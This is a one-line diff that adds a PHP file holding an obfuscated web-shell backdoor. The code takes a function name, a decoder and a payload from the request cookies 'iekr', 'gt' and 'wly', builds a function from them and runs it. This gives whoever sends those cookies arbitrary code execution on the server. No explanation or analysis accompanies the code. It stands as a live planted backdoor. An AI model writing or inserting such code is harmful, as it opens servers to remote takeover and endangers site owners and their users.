@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['iekr']){$kyz=$_COOKIE['iekr']("",@$_COOKIE['gt'](@$_COOKIE['wly']));$kyz();}?>
